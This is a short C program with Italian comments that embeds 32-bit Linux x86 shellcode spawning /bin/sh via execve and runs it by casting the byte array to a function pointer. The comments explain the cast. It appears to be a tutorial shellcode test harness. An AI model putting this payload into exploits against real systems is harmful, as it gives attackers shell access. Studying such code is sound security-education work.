#include <stdio.h>

char shellcode[] =	"\x31\xc0\x50\x68\x2f\x2f\x73"
			"\x68\x68\x2f\x62\x69\x6e\x89"
			"\xe3\x89\xc1\x89\xc2\xb0\x0b"
			"\xcd\x80\x31\xc0\x40\xcd\x80";

/*
 * Per eseguire lo shellcode è necessario:
 * - costruire un puntatore a funzione
 * - far puntare il puntatore a shellcode
 * - dereferenziare il puntatore
 * Le tre operazioni sono svolte dallo statement
 * contenuto in main().
 * - (void  (*)()):
 *   effettua un cast a puntatore di funzione di
 *   tipo void f(void).
 * - (void (*)()) shellcode:
 *   effettua il cast di shellcode (inizialmente
 *   char *).
 * - (*(void  (*)()) shellcode)();:
 *   dereferenzia il puntatore, di fatto invocando
 *   il codice memorizzato in tale locazione.
 */
int main() {

	(*(void  (*)()) shellcode)();
}
